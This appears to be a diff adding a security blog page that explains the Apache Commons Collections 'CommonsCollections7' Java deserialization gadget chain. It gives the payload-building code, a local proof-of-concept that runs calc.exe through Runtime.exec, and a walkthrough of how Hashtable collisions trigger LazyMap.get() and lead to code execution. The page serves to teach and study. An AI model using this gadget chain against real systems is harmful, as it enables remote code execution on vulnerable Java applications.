@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CommonsCollection7 | zdaylabs</title>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 32 32%27%3E%3Crect width=%2732%27 height=%2732%27 rx=%277%27 fill=%27%237c9cff%27/%3E%3Ctext x=%2716%27 y=%2723%27 font-size=%2720%27 font-weight=%27800%27 text-anchor=%27middle%27 fill=%27%23090b10%27 font-family=%27sans-serif%27%3EZ%3C/text%3E%3C/svg%3E">
+  <link rel="stylesheet" href="style.css">
+  <meta name="theme-color" content="#090b10">
+</head>
+<body>
+  <a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="index.html" aria-label="ZDaylabs home"><span class="brand-mark" aria-hidden="true">Z</span>ZDaylabs</a>
+    <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="site-nav" aria-label="Toggle navigation"><span></span></button>
+    <nav class="site-nav" id="site-nav" aria-label="Primary">
+      <a href="index.html">Home</a>
+      <a href="blogs.html">Blogs</a>
+      <a href="research.html">Research</a>
+      <a href="policy.html">Disclosure</a>
+      <a href="contact.html">Contact</a>
+      <span class="nav-social">
+        <a href="https://www.linkedin.com/in/swagatkumar/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+        <a href="https://x.com/webspl01t3r" target="_blank" rel="noopener noreferrer">X</a>
+      </span>
+    </nav>
+  </div>
+</header>
+
+
+  <main id="main" class="article">
+<h1>CommonsCollection7</h1>
+
+<p>
+  In this blog post, we will explore the CommonsCollections7 payload.
+  <br>
+  Before diving into the CommonsCollections7 payload, let's take a moment to understand HashTables.
+</p>
+
+<p>
+  A <code>Hashtable</code> in Java is a data structure used to store key-value pairs. 
+  It allows fast access and retrieval using the <code>get()</code> and <code>put()</code> methods, 
+  making it one of the foundational classes in Java's Collections Framework.
+</p>
+
+
+<p>Let's start with a basic example:</p>
+
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Hashtable</span>&lt;<span style="color: #cf8e6d;">String</span>, <span style="color: #cf8e6d;">String</span>&gt; ht = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Hashtable</span>&lt;&gt;();
+
+ht.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"language"</span>, <span style="color: #6aab73;">"Java"</span>);
+ht.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"author"</span>, <span style="color: #6aab73;">"James Gosling"</span>);
+
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ht.<span style="color: #56a8f5;">get</span>(<span style="color: #6aab73;">"language"</span>));  <span style="color: #808080;">// Output: Java</span>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ht.<span style="color: #56a8f5;">get</span>(<span style="color: #6aab73;">"author"</span>));    <span style="color: #808080;">// Output: James Gosling</span></pre></div>
+
+<p>
+  Behind the scenes, when you insert a key such as <code>"language"</code>, 
+  Java internally computes a hash using the key's <code>hashCode()</code> method. 
+  This method returns an integer that acts as a fingerprint of the object and 
+  determines where in memory (specifically, in the internal array) the value should be stored.
+</p>
+
+<p>
+    For example:
+</p>
+
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">String</span> key1 = <span style="color: #6aab73;">"Aa"</span>;
+<span style="color: #cf8e6d;">String</span> key2 = <span style="color: #6aab73;">"BB"</span>;
+
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(key1.<span style="color: #56a8f5;">hashCode</span>());  <span style="color: #808080;">// 2112</span>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(key2.<span style="color: #56a8f5;">hashCode</span>());  <span style="color: #808080;">// 2112 (collision!)</span></pre></div>
+
+<p>
+  Here, both keys produce the same hash code (<code>2112</code>) despite being different strings — 
+  this is known as a <strong>hash collision</strong>, and we'll discuss how it is handled shortly.
+</p>
+
+
+<hr>
+
+<h3> How Hashtable Uses <code>hashCode()</code></h3>
+
+<p>
+    Once Java computes the <code>hashCode()</code>, it must convert it into an index within the internal array of the <code>Hashtable</code>. 
+    It does this using the following line of code:
+</p>
+
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">int</span> index = (hash &amp; <span style="color: #b3ae60;">0x7FFFFFFF</span>) % table.length;</pre></div>
+
+<ul>
+    <li><code>hash &amp; 0x7FFFFFFF</code>: This bitmask ensures the hash code is positive (since <code>hashCode()</code> can return negative values).</li>
+    <li><code>% table.length</code>: This maps the hash to a valid index within the internal array.</li>
+</ul>
+
+<p>
+    So if your hashtable has 16 slots, and <code>hashCode()</code> returns 2112, then:
+</p>
+
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">index = (<span style="color: #b3ae60;">2112</span> &amp; <span style="color: #b3ae60;">0x7FFFFFFF</span>) % <span style="color: #b3ae60;">16</span> = <span style="color: #b3ae60;">0</span></pre></div>
+
+<hr>
+
+<h3> What If Two Keys End Up at the Same Index?</h3>
+
+<p>
+    That's where hash collisions come in. Java handles them using a technique called <strong>chaining</strong>: it stores multiple entries at the same index as a linked list.
+</p>
+
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Hashtable</span>&lt;<span style="color: #cf8e6d;">String</span>, <span style="color: #cf8e6d;">String</span>&gt; ht = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Hashtable</span>&lt;&gt;();
+
+<span style="color: #cf8e6d;">String</span> key1 = <span style="color: #6aab73;">"Aa"</span>;  <span style="color: #808080;">// hashCode = 2112</span>
+<span style="color: #cf8e6d;">String</span> key2 = <span style="color: #6aab73;">"BB"</span>;  <span style="color: #808080;">// hashCode = 2112 (collision)</span>
+
+ht.<span style="color: #56a8f5;">put</span>(key1, <span style="color: #6aab73;">"first"</span>);
+ht.<span style="color: #56a8f5;">put</span>(key2, <span style="color: #6aab73;">"second"</span>);
+
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ht.<span style="color: #56a8f5;">get</span>(key1)); <span style="color: #808080;">// Output: first</span>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ht.<span style="color: #56a8f5;">get</span>(key2)); <span style="color: #808080;">// Output: second</span></pre></div>
+
+<p>
+  When retrieving a value, the <code>Hashtable</code> checks each entry at that index 
+  using the <code>equals()</code> method to identify the correct key:
+</p>
+
+
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">for</span> (; entry != <span style="color: #cf8e6d;">null</span>; entry = entry.next) {
+    <span style="color: #cf8e6d;">if</span> ((entry.hash == hash) &amp;&amp; entry.key.<span style="color: #56a8f5;">equals</span>(key)) {
+        <span style="color: #cf8e6d;">return</span> entry.value;
+    }
+}</pre></div>
+
+<p>
+  So, even if multiple keys hash to the same bucket, Java can still retrieve the correct value as long as <code>equals()</code> distinguishes them.
+</p>
+
+<p>
+  This collision-resolution mechanism becomes especially critical in deserialization attacks, where crafted objects override <code>equals()</code> and <code>hashCode()</code> to trigger specific behavior — for example, transformer chains in CommonsCollections gadgets.
+</p>
+
+<h4>With the above knowledge about the Hashtable, let's jump into the CC7 payload.</h4>
+
+
+    <p>
+        Below is how the payload looks like
+        
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">Hashtable</span> <span style="color: #56a8f5;">getObject</span>(<span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">String</span> command) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">Exception</span> {
+
+    <span style="color: #808080;">// Reusing transformer chain and LazyMap gadgets from previous payloads</span>
+    <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">String</span>[] execArgs = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{command};
+
+    <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Transformer</span> transformerChain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{});
+
+    <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Transformer</span>[] transformers = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>),
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>,
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>},
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]}),
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>,
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>},
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]}),
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>,
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>},
+            execArgs),
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #b3ae60;">1</span>)};
+
+    <span style="color: #cf8e6d;">Map</span> innerMap1 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+    <span style="color: #cf8e6d;">Map</span> innerMap2 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+
+    <span style="color: #808080;">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
+    <span style="color: #cf8e6d;">Map</span> lazyMap1 = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap1, transformerChain);
+    lazyMap1.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"yy"</span>, <span style="color: #b3ae60;">1</span>);
+
+    <span style="color: #cf8e6d;">Map</span> lazyMap2 = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap2, transformerChain);
+    lazyMap2.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"zZ"</span>, <span style="color: #b3ae60;">1</span>);
+
+    <span style="color: #808080;">// Use the colliding Maps as keys in Hashtable</span>
+    <span style="color: #cf8e6d;">Hashtable</span> hashtable = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Hashtable</span>();
+    hashtable.<span style="color: #56a8f5;">put</span>(lazyMap1, <span style="color: #b3ae60;">1</span>);
+    hashtable.<span style="color: #56a8f5;">put</span>(lazyMap2, <span style="color: #b3ae60;">2</span>);
+
+    <span style="color: #cf8e6d;">Reflections</span>.<span style="color: #56a8f5;">setFieldValue</span>(transformerChain, <span style="color: #6aab73;">"iTransformers"</span>, transformers);
+
+    <span style="color: #808080;">// Needed to ensure hash collision after previous manipulations</span>
+    lazyMap2.<span style="color: #56a8f5;">remove</span>(<span style="color: #6aab73;">"yy"</span>);</pre></div>
+
+    <span style="color: #cf8e6d;">return</span> hashtable;
+}</pre></div>
+    </p>
+    <p>
+      So, the payload uses a <code>TransformerChain</code> and <code>LazyMap</code> together with a <code>Hashtable</code>.
+  </p>
+  
+  <p>
+      <i>We discussed <code>LazyMap</code> in CC5 — please read that section if you're unfamiliar with its role in deserialization.</i>
+  </p>
+  
+  <p>
+      Let's rewrite the payload to reproduce RCE locally.
+  </p>
+  
+    <div>
+
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.Hashtable;
+<span style="color: #cf8e6d;">import</span> java.util.List;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
+
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.LazyMap;
+
+<span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">cc7</span> {
+
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">static</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
+
+        <span style="color: #cf8e6d;">Person</span> pt = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Person</span>(<span style="color: #6aab73;">"HelloWorld"</span>);
+        <span style="color: #cf8e6d;">ConstantTransformer</span> tr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>);
+        <span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">InvokerTransformer</span> tr3 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">InvokerTransformer</span> tr4 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{<span style="color: #6aab73;">"calc.exe"</span>});
+        <span style="color: #808080;">// System.out.println(transformer.transform(Runtime.class).getClass().getName());</span>
+        <span style="color: #808080;">// System.out.println(tr4.transform(tr3.transform(transformer.transform(tr.transform("HELLO")))));</span>
+
+        <span style="color: #cf8e6d;">ChainedTransformer</span> chain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[] { tr, transformer, tr3, tr4 });
+
+        <span style="color: #cf8e6d;">Map</span> innerMap1 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+        <span style="color: #cf8e6d;">Map</span> innerMap2 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+
+        <span style="color: #cf8e6d;">Map</span> lazyMap1 = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap1, chain);
+        lazyMap1.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"yy"</span>, <span style="color: #b3ae60;">1</span>);
+
+        <span style="color: #cf8e6d;">Map</span> lazyMap2 = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap2, chain);
+        lazyMap2.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"zZ"</span>, <span style="color: #b3ae60;">1</span>);
+
+        <span style="color: #cf8e6d;">Hashtable</span> hashtable = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Hashtable</span>();
+        hashtable.<span style="color: #56a8f5;">put</span>(lazyMap1, <span style="color: #b3ae60;">1</span>);
+        hashtable.<span style="color: #56a8f5;">put</span>(lazyMap2, <span style="color: #b3ae60;">2</span>);
+    }</pre></div>
+}
+
+            </code>
+        </pre>
+        </div>
+    <div>
+        <p>
+            Now lets understand the above code and flow.<br>
+            When we call the put() on hash table the below code gets executed.<br>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">synchronized</span> <span style="color: #cf8e6d;">V</span> <span style="color: #56a8f5;">put</span>(<span style="color: #cf8e6d;">K</span> key, <span style="color: #cf8e6d;">V</span> value) {
+    <span style="color: #808080;">// Make sure the value is not null</span>
+    <span style="color: #cf8e6d;">if</span> (value == <span style="color: #cf8e6d;">null</span>) {
+        <span style="color: #cf8e6d;">throw</span> <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">NullPointerException</span>();
+    }
+
+    <span style="color: #808080;">// Makes sure the key is not already in the hashtable.</span>
+    <span style="color: #cf8e6d;">Entry</span>&lt;?,?&gt; tab[] = table;
+    <span style="color: #cf8e6d;">int</span> hash = key.<span style="color: #56a8f5;">hashCode</span>();
+    <span style="color: #cf8e6d;">int</span> index = (hash &amp; <span style="color: #b3ae60;">0x7FFFFFFF</span>) % tab.length;
+    <span style="color: #bbb529;">@SuppressWarnings</span>(<span style="color: #6aab73;">"unchecked"</span>)
+    <span style="color: #cf8e6d;">Entry</span>&lt;<span style="color: #cf8e6d;">K</span>,<span style="color: #cf8e6d;">V</span>&gt; entry = (<span style="color: #cf8e6d;">Entry</span>&lt;<span style="color: #cf8e6d;">K</span>,<span style="color: #cf8e6d;">V</span>&gt;)tab[index];
+    <span style="color: #cf8e6d;">for</span>(; entry != <span style="color: #cf8e6d;">null</span> ; entry = entry.next) {
+        <span style="color: #cf8e6d;">if</span> ((entry.hash == hash) &amp;&amp; entry.key.<span style="color: #56a8f5;">equals</span>(key)) {
+            <span style="color: #cf8e6d;">V</span> old = entry.value;
+            entry.value = value;
+            <span style="color: #cf8e6d;">return</span> old;
+        }
+    }
+
+    <span style="color: #56a8f5;">addEntry</span>(hash, key, value, index);
+    <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">null</span>;
+}</pre></div>
+<p>
+  If you check the code above, it first takes the entry, gets its <code>hashCode()</code>, and then checks for collisions inside the <code>for</code> loop.<br>
+  If the <code>for</code> loop evaluates to true, the <code>if</code> condition is checked.<br>
+  However, during the first entry the condition in the <code>for</code> loop fails, so it never calls <code>entry.key.equals()</code>.<br>
+</p>
+
+<p>
+  On the second <code>put</code>, with entries like <code>yy</code> and <code>zZ</code>, the hash codes of these two are exactly the same (i.e., <code>3812</code>).<br>
+  So the <code>if</code> condition is triggered and, since both hashes match, <code>entry.key.equals()</code> will be called.<br>
+</p>
+
+<p>
+  Now the entries we have in the Hashtable are <code>LazyMap</code> entries.<br>
+  The <code>LazyMap</code> itself does not declare an <code>equals()</code> method, but it extends <code>AbstractMapDecorator</code>, which provides the <code>equals()</code> implementation.
+</p>
+
+            <img src="images/cc/abstractmapdecorator_equals.PNG"><br>
+        </p>
+        <p> Now this equals() at AbstractMapDecorator calls map.equals() , map being an abstract class the AbstractMap.equals() gets called</p>
+        <P>
+            Below is how the equals() at AbstractMap looks Like
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">boolean</span> <span style="color: #56a8f5;">equals</span>(<span style="color: #cf8e6d;">Object</span> o) {
+    <span style="color: #cf8e6d;">if</span> (o == <span style="color: #cf8e6d;">this</span>)
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">true</span>;
+
+    <span style="color: #cf8e6d;">if</span> (!(o <span style="color: #cf8e6d;">instanceof</span> <span style="color: #cf8e6d;">Map</span>))
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+    <span style="color: #cf8e6d;">Map</span>&lt;?,?&gt; m = (<span style="color: #cf8e6d;">Map</span>&lt;?,?&gt;) o;
+    <span style="color: #cf8e6d;">if</span> (m.<span style="color: #56a8f5;">size</span>() != <span style="color: #56a8f5;">size</span>())
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+
+    <span style="color: #cf8e6d;">try</span> {
+        <span style="color: #cf8e6d;">Iterator</span>&lt;<span style="color: #cf8e6d;">Entry</span>&lt;<span style="color: #cf8e6d;">K</span>,<span style="color: #cf8e6d;">V</span>&gt;&gt; i = <span style="color: #56a8f5;">entrySet</span>().<span style="color: #56a8f5;">iterator</span>();
+        <span style="color: #cf8e6d;">while</span> (i.<span style="color: #56a8f5;">hasNext</span>()) {
+            <span style="color: #cf8e6d;">Entry</span>&lt;<span style="color: #cf8e6d;">K</span>,<span style="color: #cf8e6d;">V</span>&gt; e = i.<span style="color: #56a8f5;">next</span>();
+            <span style="color: #cf8e6d;">K</span> key = e.<span style="color: #56a8f5;">getKey</span>();
+            <span style="color: #cf8e6d;">V</span> value = e.<span style="color: #56a8f5;">getValue</span>();
+            <span style="color: #cf8e6d;">if</span> (value == <span style="color: #cf8e6d;">null</span>) {
+                <span style="color: #cf8e6d;">if</span> (!(m.<span style="color: #56a8f5;">get</span>(key)==<span style="color: #cf8e6d;">null</span> &amp;&amp; m.<span style="color: #56a8f5;">containsKey</span>(key)))
+                    <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+            } <span style="color: #cf8e6d;">else</span> {
+                <span style="color: #cf8e6d;">if</span> (!value.<span style="color: #56a8f5;">equals</span>(m.<span style="color: #56a8f5;">get</span>(key)))
+                    <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+            }
+        }
+    } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">ClassCastException</span> unused) {
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+    } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">NullPointerException</span> unused) {
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+    }
+
+    <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">true</span>;
+}</pre></div>
+        </P>
+        <p>
+          In the snippet above, pay attention to the <code>else</code> block where we call <code>m.get(key)</code>. 
+          If you look closely, the input type here is <code>Object</code>, and we have passed a <code>LazyMap</code>. 
+          The local variable <code>m</code> is set to that object, so when we call <code>m.get()</code>, <code>LazyMap.get()</code> is invoked.
+      </p>
+      
+      <p>
+          <code>LazyMap.get()</code> checks whether the key exists. If the key does not exist, it calls the <code>TransformerChain</code> that was initialized during <code>decorate()</code>.
+      </p>
+      
+      <p>
+          That's how we end up executing the <code>TransformerChain</code>, which ultimately leads to code execution.
+      </p>
+      
+    </div>
+
+
+
+
+
+
+<p>
+    <img src="images/cc/cc7calcpop.PNG">
+</p>
+
+
+<p>
+    This is how the CommonsCollection7 Payload works, staring from the EntryPoint to Code Execution
+</p>
+
+<h4>Summary:</h4>
+<ul>
+  <li>We use two <code>LazyMap</code> instances with colliding hashCodes as keys.</li>
+  <li>This forces <code>equals()</code> to be called during the second <code>put()</code>.</li>
+  <li>The <code>equals()</code> call triggers <code>LazyMap.get()</code> on a missing key.</li>
+  <li><code>LazyMap</code> uses the transformer chain to generate the value — which leads to RCE.</li>
+</ul>
+
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+  </main>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span>&copy; 2025 ZDaylabs. We exploit, analyze, and document.</span>
+    <nav class="footer-links" aria-label="Footer">
+      <a href="research.html">Research</a>
+      <a href="blogs.html">Blogs</a>
+      <a href="policy.html">Disclosure policy</a>
+      <a href="https://github.com/w3bspl01t3r" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </nav>
+  </div>
+</footer>
+<script src="navigation.js" defer></script>
+</body>
+</html>
